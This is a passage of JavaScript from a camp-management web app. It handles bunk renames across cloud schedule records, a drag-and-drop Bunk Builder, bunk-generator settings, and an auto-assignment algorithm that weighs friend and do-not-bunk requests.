                    _toast('⚠️ Bunk removed, but '+failed.length+' schedule record(s) failed to update. Try removing again or check connection.','warning');
                }
            });
        }).catch(function(err){
            console.error('[Me] Purge failed after retries:',err);
            _toast('⚠️ Removed bunk locally but cloud cleanup failed: '+(err.message||err)+'. Try again.','error');
        });
    }catch(e){
        console.error('[Me] Purge exception:',e);
        _toast('⚠️ Bunk removed locally but cloud cleanup hit an error. Refresh and try again.','error');
    }
}

// ★★★ CB-94: rename a bunk's schedule data instead of destroying it. A bunk
// rename was treated as delete(old)+create(new): _purgeOrphanedBunks hard-deleted
// the old bunk's cloud schedule rows while the new name started empty. This
// migrates the bunk key in memory + every cloud daily_schedules row
// (scheduleAssignments + leagueAssignments) so the schedule survives the rename.
function _propagateBunkRename(oldB,newB){
    if(!oldB||!newB||oldB===newB)return;
    console.log('[Me] Propagating bunk rename in schedules:',oldB,'→',newB);
    // 1. in-memory maps
    try{
        ['scheduleAssignments','scheduleSegments','leagueAssignments'].forEach(function(k){
            var m=window[k];
            if(m&&m[oldB]!==undefined&&m[newB]===undefined){m[newB]=m[oldB];delete m[oldB];}
        });
    }catch(_){}
    // 2. cloud daily_schedules (best-effort; non-fatal on error)
    try{
        var client=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():window.supabase;
        var campId=window.CampistryDB&&window.CampistryDB.getCampId?window.CampistryDB.getCampId():(window.getCampId?window.getCampId():null);
        if(!client||!campId)return;
        client.from('daily_schedules').select('id,schedule_data').eq('camp_id',campId).then(function(res){
            if(res.error)throw res.error;
            (res.data||[]).forEach(function(record){
                var sd=record.schedule_data||{};
                var sa=Object.assign({},sd.scheduleAssignments||{});
                var la=Object.assign({},sd.leagueAssignments||{});
                var modified=false;
                if(sa[oldB]!==undefined){if(sa[newB]===undefined)sa[newB]=sa[oldB];delete sa[oldB];modified=true;}
                if(la[oldB]!==undefined){if(la[newB]===undefined)la[newB]=la[oldB];delete la[oldB];modified=true;}
                if(modified){
                    client.from('daily_schedules')
                        .update({schedule_data:Object.assign({},sd,{scheduleAssignments:sa,leagueAssignments:la}),updated_at:new Date().toISOString()})
                        .eq('id',record.id)
                        .then(function(r){if(r.error)console.error('[Me] bunk-rename update failed',record.id,r.error);});
                }
            });
        }).catch(function(err){console.error('[Me] bunk-rename cloud propagate failed:',err);});
    }catch(e){console.error('[Me] bunk-rename exception:',e);}
    // 3. rotation_counts (cloud) — carry the bunk's rotation HISTORY to the new
    //    name so fairness doesn't treat the renamed bunk as brand-new (which would
    //    let it re-draw activities it just did). Best-effort; mirrors the activity
    //    rename migration. Async, non-blocking.
    try{
        if(window.RotationCloud&&typeof window.RotationCloud.renameBunk==='function'){
            window.RotationCloud.renameBunk(oldB,newB);
        }
    }catch(_){}
    // 4. bunkMetaData (size / player-count config in the app1 blob) — rename the key
    //    so the renamed bunk keeps its configured size instead of resetting.
    try{
        var _gs=window.loadGlobalSettings&&window.loadGlobalSettings();
        var _app1=_gs&&_gs.app1;
        if(_app1&&_app1.bunkMetaData&&_app1.bunkMetaData[oldB]!==undefined&&_app1.bunkMetaData[newB]===undefined){
            _app1.bunkMetaData[newB]=_app1.bunkMetaData[oldB];
            delete _app1.bunkMetaData[oldB];
            if(typeof window.saveGlobalSettings==='function'){
                window.saveGlobalSettings('app1',_app1);
                if(typeof window.forceSyncToCloud==='function'){try{window.forceSyncToCloud()}catch(_){}}
            }
        }
    }catch(_){}
}

// ── BUNK BUILDER ─────────────────────────────────────────────────
function renderBB(){
    var c=document.getElementById('page-bunkbuilder');
    var allB=[];Object.entries(structure).forEach(function([div,d]){Object.entries(d.grades||{}).forEach(function([gr,g]){(g.bunks||[]).forEach(function(b){allB.push({name:b,div:div,gr:gr,color:d.color||'#94A3B8'})})})});
    // Placement is read straight from roster[name].bunk — the same field the
    // camper Edit modal, CSV import, and Campistry Link all read/write — so
    // this screen can never drift out of sync with them (see loadData()'s
    // one-time bunkAsgn→roster.bunk migration for camps that placed campers
    // here before this fix).
    var cArr=Object.keys(roster);
    var un=cArr.filter(function(n){return!roster[n].bunk}),placed=cArr.length-un.length;
    var h=_layoutTabsHtml('bunkbuilder');
    h+='<div class="sec-hd"><div><h2 class="sec-title">Bunk Builder</h2><p class="sec-desc">'+placed+'/'+cArr.length+' placed</p></div><div class="sec-actions"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.openBunkGenSettings()">⚙ Bunk Settings</button><button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.autoGenerateBunks()">⚡ Auto-Generate</button><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.clearBunks()">Clear</button></div></div>';
    if(!allB.length){h+='<div class="me-empty"><h3>No bunks</h3><p>Create divisions and bunks in Camp Structure first.</p></div>'}
    else{
        h+='<div class="bb"><div class="bb-pool" ondragover="event.preventDefault();this.querySelector(\'.bb-pool-bd\').classList.add(\'dragover\')" ondragleave="this.querySelector(\'.bb-pool-bd\').classList.remove(\'dragover\')" ondrop="CampistryMe.bbDrop(\'__pool__\',event);this.querySelector(\'.bb-pool-bd\').classList.remove(\'dragover\')">';
        h+='<div class="bb-pool-hd"><h3>Unassigned ('+un.length+')</h3></div><div class="bb-pool-bd">';
        if(!un.length)h+='<div style="text-align:center;padding:16px 6px;color:var(--ok);font-size:.8rem;font-weight:600">All placed ✓</div>';
        else un.forEach(function(n){h+=bbC(n)});
        h+='</div></div><div class="bb-board">';
        var lastD='';
        allB.forEach(function(bk){
            if(bk.div!==lastD){if(lastD)h+='</div>';lastD=bk.div;h+='<div class="bb-div"><span class="bb-dot" style="background:'+bk.color+'"></span>'+esc(bk.div)+'</div><div class="bb-gl">'+esc(bk.gr)+'</div><div class="bb-grid">'}
            var ids=cArr.filter(function(n){return roster[n].bunk===bk.name});
            var mCt=bunkManualCounts[bk.name];
            var dispCount=(mCt!=null)?mCt:ids.length;
            var staff=bunkStaff[bk.name]||[];
            h+='<div class="bb-bunk" ondragover="event.preventDefault();this.classList.add(\'dragover\')" ondragleave="this.classList.remove(\'dragover\')" ondrop="CampistryMe.bbDrop(\''+je(bk.name)+'\',event);this.classList.remove(\'dragover\')">';
            h+='<div class="bb-bunk-hd"><span class="bb-bunk-nm">'+esc(bk.name)+'</span><span class="bb-bunk-ct"'+(mCt!=null?' style="color:var(--me)" title="Manual count"':' title="Roster count"')+'>'+dispCount+'</span></div>';
            h+='<div class="bb-staff" style="padding:2px 0 8px;cursor:pointer" onclick="CampistryMe.openBunkStaffModal(\''+je(bk.name)+'\')" title="Manage staff for this bunk">';
            if(staff.length)h+=staff.map(function(s){return '<span style="display:inline-block;background:var(--s100);border-radius:var(--r);padding:2px 8px;margin:0 4px 4px 0;font-size:.68rem;font-weight:600;color:var(--s600)">'+esc(s.name)+' · '+esc(s.role||'Staff')+'</span>'}).join('');
            else h+='<span style="font-size:.72rem;color:var(--me);font-weight:600;cursor:pointer">+ Add staff</span>';
            h+='</div>';
            h+='<div class="bb-campers">';
            if(!ids.length)h+='<div class="bb-empty">Drop campers here</div>';
            else ids.forEach(function(n){h+=bbC(n)});
            h+='</div></div>';
        });
        if(lastD)h+='</div>';
        h+='</div></div>';
    }
    c.innerHTML=h;
}
// Clicking a card (as opposed to dragging it) pops up their bunk requests —
// a head counselor scanning the board needs to know who asked to be with
// whom without opening the full camper profile for every kid. The 🔗/🚫
// badges make that visible even before clicking, for anyone with a request
// on file.
function bbC(n){
    var d=roster[n]||{};
    var req=_camperBunkRequests(n);
    var badges='';
    if(req.friends.length)badges+='<span title="Has a bunk request" style="font-size:.62rem">🔗</span>';
    if(req.avoid.length)badges+='<span title="Has a do-not-bunk request" style="font-size:.62rem">🚫</span>';
    return '<div class="bb-c" draggable="true" ondragstart="event.dataTransfer.setData(\'text/plain\',\''+je(n)+'\')" onclick="CampistryMe.showCamperBunkRequests(\''+je(n)+'\')" style="cursor:pointer"><div style="flex:1;min-width:0"><div class="bb-c-nm">'+esc(n)+'</div></div>'+badges+(d.allergies||d.medications?'<span style="color:var(--err);font-size:.6rem">⚠</span>':'')+'</div>';
}
// Quick-view popup for a camper's bunk requests, opened from a Bunk Builder
// card click — the profile's full Bunk Requests section (viewCamper) shows
// the same data, this is just the fast path for the board itself.
function showCamperBunkRequests(n){
    var d=roster[n]; if(!d)return;
    var req=_camperBunkRequests(n);
    var body='';
    if(!req.friends.length&&!req.avoid.length){
        body='<p style="font-size:.85rem;color:var(--s500)">No bunk requests on file for '+esc(n)+'.</p>';
    }else{
        if(req.friends.length)body+='<div class="cv-row"><span class="cv-lbl">Wants to bunk with</span><span class="cv-val">'+esc(req.friends.join(', '))+'</span></div>';
        if(req.avoid.length)body+='<div class="cv-row"><span class="cv-lbl">Do not bunk with</span><span class="cv-val cv-warn">'+esc(req.avoid.join(', '))+'</span></div>';
    }
    body+='<button class="me-btn me-btn--sec me-btn--sm" style="margin-top:12px" onclick="CampistryMe.closeModal(\'dynModal\');CampistryMe.viewCamper(\''+je(n)+'\')">Open full profile</button>';
    showModal(n,body,null);
}
function bbDrop(t,e){
    e.preventDefault();
    var n=e.dataTransfer.getData('text/plain');if(!n)return;
    var c=roster[n];if(!c)return;
    if(t==='__pool__'){
        c.bunk='';
    }else{
        c.bunk=t;
        var loc=_bunkDivGrade(t);
        if(loc){c.division=loc.div;c.grade=loc.gr}
    }
    save();renderBB();
}
function autoAssign(){
    var allB=[];Object.entries(structure).forEach(function([div,d]){Object.entries(d.grades||{}).forEach(function([gr,g]){(g.bunks||[]).forEach(function(b){allB.push({name:b,gr:gr,div:div})})})});
    var counts={};allB.forEach(function(b){counts[b.name]=0});
    var campers=Object.entries(roster);
    campers.sort(function(a,b){return(a[1].grade||'').localeCompare(b[1].grade||'')});
    campers.forEach(function([n,d]){
        var el=allB.filter(function(b){return b.gr===d.grade});
        if(!el.length)el=allB.filter(function(b){return b.div===d.division});
        if(!el.length)el=allB;
        if(!el.length)return;
        el.sort(function(a,b){return counts[a.name]-counts[b.name]});
        var chosen=el[0];
        d.bunk=chosen.name;d.division=chosen.div;d.grade=chosen.gr;
        counts[chosen.name]++;
    });
    save();renderBB();toast('Auto-assigned')
}
async function clearBunks(){var ok=await confirmDialog({title:'Clear All Bunk Assignments?',message:'Every camper will be unassigned from their bunk.',confirmLabel:'Clear All',danger:true});if(!ok)return;Object.values(roster).forEach(function(c){c.bunk=''});save();renderBB();toast('Cleared')}

// ═══ BUNK GENERATOR SETTINGS ════════════════════════════════════
// Camp-wide policy consumed by autoGenerateBunks() below and by the
// Post-Acceptance Form's friend-request inputs (campistry_postaccept.html).
// Every camp field here maps 1:1 to something the user asked for: "camps
// allow 2, others 3" (maxRequests), "we will use y" (honoredRequests),
// min/max per bunk, and the ranked list of what matters for grouping
// unrelated kids (criteria).
var BUNK_CRITERIA_CATALOG=[
    {key:'school',label:'School'},
    {key:'area',label:'Area / City'},
    {key:'age',label:'Age'}
];
function openBunkGenSettings(){
    var c=bunkGenConfig;
    var h='<div class="fsec">Bunk Size</div>';
    h+='<div class="fr">'
        +'<div class="fg"><label class="fl">Minimum per bunk</label><input type="number" min="1" id="bgMin" class="fi" value="'+(c.minBunkSize||0)+'"></div>'
        +'<div class="fg"><label class="fl">Maximum per bunk</label><input type="number" min="1" id="bgMax" class="fi" value="'+(c.maxBunkSize||0)+'"></div>'
        +'</div>';
    h+='<div class="fsec">School Grades</div>';
    h+='<p style="font-size:.76rem;color:var(--s500);margin:0 0 8px">Every camp\'s grades are different — set the list parents pick from on Registration (and Manual Entry / Edit Camper), then map each bunk group to the grade(s) it takes in Camp Structure. Drag to reorder.</p>';
    h+=_renderSchoolGradeListHtml();
    h+='<div class="fsec">Friend Requests</div>';
    h+='<div class="fg"><label class="fl" style="display:flex;align-items:center;gap:7px;cursor:pointer"><input type="checkbox" id="bgReqOn"'+(c.requestsEnabled?' checked':'')+'> Let parents request bunkmates on the Post-Acceptance Form</label></div>';
    h+='<div class="fr">'
        +'<div class="fg"><label class="fl">Friends a parent may request</label><input type="number" min="0" max="10" id="bgMaxReq" class="fi" value="'+(c.maxRequests||0)+'"></div>'
        +'<div class="fg"><label class="fl">Of those, how many we\'ll try to honor</label><input type="number" min="0" max="10" id="bgHonReq" class="fi" value="'+(c.honoredRequests||0)+'"></div>'
        +'</div>';
    h+='<div class="fg"><label class="fl" style="display:flex;align-items:center;gap:7px;cursor:pointer"><input type="checkbox" id="bgAvoidOn"'+(c.doNotBunkEnabled?' checked':'')+'> Let parents request who NOT to bunk with</label></div>';
    h+='<div class="fg"><label class="fl">Do-not-bunk-with requests allowed</label><input type="number" min="0" max="10" id="bgMaxAvoid" class="fi" value="'+(c.maxDoNotBunk||0)+'"></div>';
    h+='<div class="fsec">What Else Matters For Grouping</div>';
    h+='<p style="font-size:.76rem;color:var(--s500);margin:0 0 8px">Drag to set priority. The generator uses this — top to bottom — to group unrelated kids together (same school, same area, etc.) after friend requests are placed.</p>';
    var order=(c.criteria||[]).map(function(x){return x.key});
    BUNK_CRITERIA_CATALOG.forEach(function(x){ if(order.indexOf(x.key)<0)order.push(x.key); });
    var enabledByKey={}; (c.criteria||[]).forEach(function(x){enabledByKey[x.key]=x.enabled!==false;});
    var byKey={}; BUNK_CRITERIA_CATALOG.forEach(function(x){byKey[x.key]=x;});
    h+='<div id="bgCritList">'+order.map(function(k){
        var x=byKey[k]; if(!x)return'';
        var on=enabledByKey[k]!==false;
        return '<div class="bgCritRow" data-key="'+k+'" draggable="true" style="display:flex;align-items:center;gap:10px;padding:9px 10px;border:1px solid var(--s200);border-radius:8px;margin-bottom:5px;background:#fff;cursor:grab">'
            +'<span style="color:var(--s300);font-size:.95rem;line-height:1;letter-spacing:-1px">⠿⠿</span>'
            +'<label style="flex:1;display:flex;align-items:center;gap:8px;font-size:.83rem;font-weight:600;color:var(--s700);cursor:pointer"><input type="checkbox" class="bgCritOn"'+(on?' checked':'')+'>'+esc(x.label)+'</label>'
            +'</div>';
    }).join('')+'</div>';

    showModal('Bunk Generator Settings',h,function(){
        bunkGenConfig={
            minBunkSize:Math.max(1,parseInt((document.getElementById('bgMin')||{}).value,10)||1),
            maxBunkSize:Math.max(1,parseInt((document.getElementById('bgMax')||{}).value,10)||1),
            requestsEnabled:!!(document.getElementById('bgReqOn')||{}).checked,
            maxRequests:Math.max(0,parseInt((document.getElementById('bgMaxReq')||{}).value,10)||0),
            honoredRequests:Math.max(0,parseInt((document.getElementById('bgHonReq')||{}).value,10)||0),
            doNotBunkEnabled:!!(document.getElementById('bgAvoidOn')||{}).checked,
            maxDoNotBunk:Math.max(0,parseInt((document.getElementById('bgMaxAvoid')||{}).value,10)||0),
            criteria:Array.prototype.map.call(document.querySelectorAll('.bgCritRow'),function(row){
                return {key:row.dataset.key,label:(byKey[row.dataset.key]||{}).label||row.dataset.key,enabled:row.querySelector('.bgCritOn').checked};
            }),
            schoolGrades:Array.prototype.map.call(document.querySelectorAll('#bgSgList .bgSgChip'),function(chip){return chip.getAttribute('data-g');})
        };
        if(bunkGenConfig.honoredRequests>bunkGenConfig.maxRequests)bunkGenConfig.honoredRequests=bunkGenConfig.maxRequests;
        if(bunkGenConfig.minBunkSize>bunkGenConfig.maxBunkSize)bunkGenConfig.minBunkSize=bunkGenConfig.maxBunkSize;
        if(!bunkGenConfig.schoolGrades.length)bunkGenConfig.schoolGrades=_defaultBunkGenConfig().schoolGrades;
        save();closeModal('dynModal');toast('Bunk settings saved');
    });
    var list=document.getElementById('bgCritList');
    if(list){ _meReorderInit(list,'.bgCritRow'); list.querySelectorAll('.bgCritRow').forEach(function(row){_meAttachItemDrag(row)}); }
    _wireSchoolGradeList();
}
// Camp-editable list of real school grades — add/remove/reorder chips, same
// interaction shape as the bunk-name chips in Camp Structure (drag to
// reorder, type + Enter to add, × to remove), kept as its own lightweight
// implementation since this list has none of the schedule-migration concerns
// a bunk rename does.
function _renderSchoolGradeListHtml(){
    var list=_schoolGradeCatalog();
    return '<div id="bgSgList" style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:8px">'+list.map(function(g){
        return '<span class="bgSgChip" data-g="'+esc(g)+'" draggable="true" style="display:inline-flex;align-items:center;gap:5px;background:var(--s100);border-radius:999px;padding:3px 6px 3px 10px;font-size:.76rem;font-weight:600;color:var(--s700);cursor:grab"><span>'+esc(g)+'</span><button type="button" class="bgSgX" style="border:none;background:none;cursor:pointer;color:var(--s400);font-size:.9rem;line-height:1;padding:0 2px">×</button></span>';
    }).join('')+'</div>'
    +'<div style="display:flex;gap:6px"><input type="text" id="bgSgAddInp" class="fi" style="flex:1" placeholder="Add a grade and press Enter"><button type="button" class="me-btn me-btn--sec me-btn--sm" id="bgSgAddBtn">+ Add</button></div>';
}
function _wireSchoolGradeList(){
    var list=document.getElementById('bgSgList');
    if(!list)return;
    _meReorderInit(list,'.bgSgChip');
    function wireChip(chip){
        _meAttachItemDrag(chip);
        var x=chip.querySelector('.bgSgX');
        if(x)x.onclick=function(){chip.remove()};
    }
    list.querySelectorAll('.bgSgChip').forEach(wireChip);
    var addInp=document.getElementById('bgSgAddInp'),addBtn=document.getElementById('bgSgAddBtn');
    function addGrade(){
        var v=(addInp.value||'').trim();
        if(!v)return;
        v.split(',').map(function(s){return s.trim();}).filter(Boolean).forEach(function(name){
            var span=document.createElement('span');
            span.className='bgSgChip';span.draggable=true;span.setAttribute('data-g',name);
            span.style.cssText='display:inline-flex;align-items:center;gap:5px;background:var(--s100);border-radius:999px;padding:3px 6px 3px 10px;font-size:.76rem;font-weight:600;color:var(--s700);cursor:grab';
            span.innerHTML='<span>'+esc(name)+'</span><button type="button" class="bgSgX" style="border:none;background:none;cursor:pointer;color:var(--s400);font-size:.9rem;line-height:1;padding:0 2px">×</button>';
            list.appendChild(span);
            wireChip(span);
        });
        addInp.value='';addInp.focus();
    }
    if(addBtn)addBtn.onclick=addGrade;
    if(addInp)addInp.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();addGrade();}});
}
function setBunkCount(bunkName,value){var n=parseInt(value,10);if(isNaN(n)||n<0)n=0;bunkManualCounts[bunkName]=n;save()}
function _clearBunkCount(bunkName){delete bunkManualCounts[bunkName];save();render(curPage);toast('Override cleared')}

// ═══ BUNK AUTO-GENERATOR ════════════════════════════════════════
// Fills only currently-unassigned campers (anyone already placed, manually
// or by a previous run, is left exactly where they are). Per grade: friend
// requests (honored up to bunkGenConfig.honoredRequests) cluster campers
// together via union-find; do-not-bunk-with is a hard constraint checked at
// every placement; leftover singles/clusters land in whichever valid bunk
// scores best on the camp's configured criteria (school/area/age/…), biased
// toward emptier bunks so bunks trend toward minBunkSize.
function _splitNames(s){
    if(Array.isArray(s))return s.map(function(x){return String(x||'').trim();}).filter(Boolean);
    return String(s||'').split(/[,;\n]+|\s+and\s+|\s*&\s*/i).map(function(x){return x.trim();}).filter(Boolean);
}
// Prefers the enrollment with post-acceptance answers (richest source) over
// an older/duplicate application for the same camper name.
function _enrollmentForCamper(name){
    var key=String(name||'').trim().toLowerCase();
    if(!key)return null;
    var matches=Object.values(enrollments).filter(function(e){return String(e.camperName||'').trim().toLowerCase()===key;});
    if(!matches.length)return null;
    matches.sort(function(a,b){
        var aw=a.postAccept?1:0,bw=b.postAccept?1:0;
        if(aw!==bw)return bw-aw;
        return String(b.appliedDate||'').localeCompare(String(a.appliedDate||''));
    });
    return matches[0];
}
// Merges every source a bunk request could have come from: the roster
// record's own Bunkmate/Do-Not-Bunk fields (office-editable in Edit Camper),
// the original registration application, and the Post-Acceptance Form —
// deduped and capped to the camp's configured limits.
function _camperBunkRequests(name){
    var cfg=bunkGenConfig,d=roster[name]||{};
    var friends=[],avoid=[];
    if(cfg.requestsEnabled!==false)friends=friends.concat(_splitNames(d.bunkmateRequest)).concat(_splitNames(d.bunkRequests));
    if(cfg.doNotBunkEnabled!==false)avoid=avoid.concat(_splitNames(d.separateFrom)).concat(_splitNames(d.doNotBunkWith));
    var enr=_enrollmentForCamper(name);
    if(enr){
        if(cfg.requestsEnabled!==false){
            friends=friends.concat(_splitNames(enr.bunkmate));
            if(enr.postAccept)friends=friends.concat(_splitNames(enr.postAccept.bunkmate));
        }
        if(cfg.doNotBunkEnabled!==false){
            avoid=avoid.concat(_splitNames(enr.separateFrom));
            if(enr.postAccept)avoid=avoid.concat(_splitNames(enr.postAccept.separate));
        }
    }
    var selfKey=String(name||'').trim().toLowerCase();
    function dedupe(arr,cap){
        var seen={},out=[];
        arr.forEach(function(n){
            var k=n.toLowerCase();
            if(!k||k===selfKey||seen[k])return;
            seen[k]=1;out.push(n);
        });
        return cap!=null?out.slice(0,Math.max(0,cap)):out;
    }
    return {friends:dedupe(friends,cfg.maxRequests),avoid:dedupe(avoid,cfg.maxDoNotBunk)};
}
// Mirrors a submitted Post-Acceptance Form's bunk requests onto the roster
// record itself — called every loadData() so the moment a parent's response
// syncs down from the cloud, it's sitting right on the camper's own profile
// (bunkRequests/doNotBunkWith) for CSV export, Campistry Lite, or anything
// else that reads roster directly, not just the bunk generator's live lookup.
function _syncPostAcceptBunkRequests(){
    Object.keys(roster).forEach(function(name){
        var enr=_enrollmentForCamper(name);
        if(!enr||!enr.postAccept)return;
        var c=roster[name];
        var friends=_splitNames(enr.postAccept.bunkmate);
        var avoid=_splitNames(enr.postAccept.separate);
        if(friends.length)c.bunkRequests=friends;
        if(avoid.length)c.doNotBunkWith=avoid;
    });
}
// Free-text names need matching to real camper records. Requires every word
// in the typed request to prefix-match a word in the candidate's name, so
// "Alice S" matches "Alice Smith" but not "Alice Jones" — best-effort, same
// tradeoff as the free-text field itself (a picker would match exactly, but
// means showing other families' kids' names to parents).
function _resolveCamperName(text,candidates){
    var t=String(text||'').trim().toLowerCase();
    if(!t)return null;
    var exact=candidates.filter(function(n){return n.toLowerCase()===t;})[0];
    if(exact)return exact;
    var reqWords=t.split(/\s+/).filter(Boolean);
    if(!reqWords.length)return null;
    var best=null;
    candidates.forEach(function(n){
        if(best)return;
        var nWords=n.toLowerCase().split(/\s+/);
        var allHit=reqWords.every(function(w){return nWords.some(function(nw){return nw.indexOf(w)===0;});});
        if(allHit)best=n;
    });
    return best;
}
function _criterionMatch(key,d1,d2){
    if(key==='school')return !!(d1.school&&d2.school&&d1.school.trim().toLowerCase()===d2.school.trim().toLowerCase());
    if(key==='area')return !!((d1.city&&d2.city&&d1.city.trim().toLowerCase()===d2.city.trim().toLowerCase())||(d1.zip&&d2.zip&&d1.zip.trim()===d2.zip.trim()));
    if(key==='age'){var a1=age(d1.dob),a2=age(d2.dob);return a1!==''&&a2!==''&&Math.abs(a1-a2)<=1;}
    return false;
}
// Breaks a friend-cluster apart just enough that no do-not-bunk pair remains
// inside any one group — each iteration moves the weaker-linked half of the
// first violating pair into its own singleton, so the cluster converges.
function _splitAvoidConflicts(group,reqMap){
    if(group.length<2)return[group];
    var groups=[group.slice()],guard=0,changed=true;
    while(changed&&guard++<50){
        changed=false;
        for(var gi=0;gi<groups.length;gi++){
            var g=groups[gi],pair=null;
            for(var i=0;i<g.length&&!pair;i++){
                for(var j=0;j<g.length;j++){
                    if(i===j)continue;
                    if(((reqMap[g[i]]&&reqMap[g[i]].avoid)||[]).indexOf(g[j])>=0){pair=[g[i],g[j]];break;}
                }
            }
            if(pair){
                var linkCount=function(x){return g.filter(function(y){return y!==x&&((reqMap[x]&&reqMap[x].friends)||[]).indexOf(y)>=0;}).length;};
                var toMove=linkCount(pair[0])<=linkCount(pair[1])?pair[0]:pair[1];
                groups[gi]=g.filter(function(x){return x!==toMove;});
                groups.push([toMove]);
                changed=true;
                break;
            }
        }
    }
    return groups.filter(function(g){return g.length>0;});
}
function _capGroupSize(groups,maxSize){
    var out=[];
    groups.forEach(function(g){
        if(g.length<=maxSize){out.push(g);return;}
        for(var i=0;i<g.length;i+=maxSize)out.push(g.slice(i,i+maxSize));
    });
    return out;
}
function _placeGroupInBunk(group,bunkName,bunkState){
    var bk=bunkState[bunkName];
    group.forEach(function(n){
        roster[n].bunk=bunkName;
        roster[n].division=bk.div;
        roster[n].grade=bk.gr;
        bk.occupants.push(n);
    });
}
// Which real school grade(s) a bunk group (Camp Structure "grade") is
// configured for — empty when the camp hasn't set this up for that group.
function _cohortSchoolGrades(div,gr){
    var g=(structure[div]&&structure[div].grades&&structure[div].grades[gr])||{};
    return Array.isArray(g.schoolGrades)?g.schoolGrades:[];
}
// The one bunk group configured for a given real school grade — null if no
// group claims it, or if more than one does (ambiguous camp config; let
// autoGenerateBunks()'s own scan surface that rather than guessing here).
function _resolveCohortBySchoolGrade(schoolGrade){
    var key=String(schoolGrade||'').trim().toLowerCase();
    if(!key)return null;
    var hit=null,multiple=false;
    Object.keys(structure).forEach(function(div){
        var grades=(structure[div]&&structure[div].grades)||{};
        Object.keys(grades).forEach(function(gr){
            if(multiple)return;
            if(_cohortSchoolGrades(div,gr).some(function(sg){return String(sg).trim().toLowerCase()===key;})){
                if(hit&&(hit.div!==div||hit.gr!==gr))multiple=true;
                else hit={div:div,gr:gr};
            }
        });
    });
    return multiple?null:hit;
}
function _bunkGenForGrade(poolNames,bunks,cfg,report){
    // Anyone in THIS pool is being placed into THIS grade's bunks, so they're
    // valid friend-request candidates even before roster[n].grade is set —
    // relying on .grade alone here would miss every camper whose grade was
    // just resolved by schoolGrade mapping rather than pre-assigned.
    var gradeCandidates=Object.keys(roster).filter(function(n){return roster[n].grade===bunks[0].gr;});
    poolNames.forEach(function(n){ if(gradeCandidates.indexOf(n)<0) gradeCandidates.push(n); });
    var reqMap={};
    poolNames.forEach(function(n){
        var r=_camperBunkRequests(n);
        var friends=r.friends.slice(0,cfg.honoredRequests).map(function(f){return _resolveCamperName(f,gradeCandidates);}).filter(Boolean);
        var avoid=r.avoid.map(function(a){return _resolveCamperName(a,gradeCandidates);}).filter(Boolean);
        reqMap[n]={friends:friends,avoid:avoid};
        report.requestsTotal+=friends.length;
    });

    var parent={};poolNames.forEach(function(n){parent[n]=n;});
    function find(x){while(parent[x]!==x){parent[x]=parent[parent[x]];x=parent[x];}return x;}
    function union(a,b){var ra=find(a),rb=find(b);if(ra!==rb)parent[ra]=rb;}
    poolNames.forEach(function(n){reqMap[n].friends.forEach(function(f){if(poolNames.indexOf(f)>=0)union(n,f);});});
    var clusterMap={};
    poolNames.forEach(function(n){var r=find(n);(clusterMap[r]=clusterMap[r]||[]).push(n);});
    var groups=Object.keys(clusterMap).map(function(k){return clusterMap[k];});

    var split=[];
    groups.forEach(function(g){split=split.concat(_splitAvoidConflicts(g,reqMap));});
    split=_capGroupSize(split,cfg.maxBunkSize);
    split.sort(function(a,b){return b.length-a.length;});

    var bunkState={};
    bunks.forEach(function(bk){
        var already=Object.keys(roster).filter(function(n){return roster[n].bunk===bk.name;});
        bunkState[bk.name]={occupants:already.slice(),div:bk.div,gr:bk.gr};
    });

    function violatesAvoid(bunkName,names){
        var occ=bunkState[bunkName].occupants;
        for(var i=0;i<names.length;i++){
            var av=(reqMap[names[i]]&&reqMap[names[i]].avoid)||[];
            for(var j=0;j<av.length;j++)if(occ.indexOf(av[j])>=0)return true;
            for(var k=0;k<occ.length;k++){
                var occReq=reqMap[occ[k]]||_camperBunkRequests(occ[k]);
                if((occReq.avoid||[]).indexOf(names[i])>=0)return true;
            }
        }
        return false;
    }
    function similarity(bunkName,names){
        var occ=bunkState[bunkName].occupants;
        if(!occ.length)return 0;
        var crit=(cfg.criteria||[]).filter(function(c){return c.enabled!==false;});
        var score=0;
        names.forEach(function(cn){
            var cd=roster[cn]||{};
            occ.forEach(function(on){
                var od=roster[on]||{};
                crit.forEach(function(c,idx){if(_criterionMatch(c.key,cd,od))score+=(crit.length-idx);});
            });
        });
        return score;
    }
    function pullWeight(names){
        var pull={};
        names.forEach(function(n){
            (reqMap[n].friends||[]).forEach(function(f){
                if(poolNames.indexOf(f)>=0)return;
                var bn=roster[f]&&roster[f].bunk;
                if(bn)pull[bn]=(pull[bn]||0)+1;
            });
        });
        return pull;
    }

    split.forEach(function(group){
        var candidates=bunks.map(function(b){return b.name;}).filter(function(bn){
            return (bunkState[bn].occupants.length+group.length)<=cfg.maxBunkSize;
        });
        if(!candidates.length){
            report.warnings.push('No room for '+group.join(', ')+' — every bunk in this grade is at capacity.');
            return;
        }
        var pull=pullWeight(group);
        var safe=candidates.filter(function(bn){return !violatesAvoid(bn,group);});
        var use=safe.length?safe:candidates;
        if(!safe.length){
            report.avoidViolations+=group.length;
            report.warnings.push('Could not avoid a do-not-bunk conflict for '+group.join(', ')+' — no bunk had room without one.');
        }
        use.sort(function(a,b){
            var sa=(pull[a]||0)*1000+similarity(a,group)*10-bunkState[a].occupants.length;
            var sb=(pull[b]||0)*1000+similarity(b,group)*10-bunkState[b].occupants.length;
            return sb-sa;
        });
        _placeGroupInBunk(group,use[0],bunkState);
    });

    poolNames.forEach(function(n){
        var myBunk=roster[n].bunk;
        (reqMap[n].friends||[]).forEach(function(f){
            if(myBunk&&roster[f]&&roster[f].bunk===myBunk)report.requestsHonored++;
        });
    });
    bunks.forEach(function(bk){
        var ct=bunkState[bk.name].occupants.length;
        if(ct>0&&ct<cfg.minBunkSize)report.underMin.push({bunk:bk.name,count:ct});
    });
}
// Campers whose grade never matched a real bunk group (missing/mismatched
// grade data) — placed by plain headcount balancing since there's no grade
// to scope requests/criteria to. Same degraded-fallback shape as the old
// autoAssign() cascade (grade → division → any bunk).
function _bunkGenFallback(names,allBunks,cfg,report){
    var counts={};allBunks.forEach(function(b){counts[b.name]=Object.keys(roster).filter(function(n){return roster[n].bunk===b.name;}).length;});
    names.forEach(function(n){
        var d=roster[n];
        var el=allBunks.filter(function(b){return b.div===d.division;});
        if(!el.length)el=allBunks;
        el=el.filter(function(b){return counts[b.name]<cfg.maxBunkSize;});
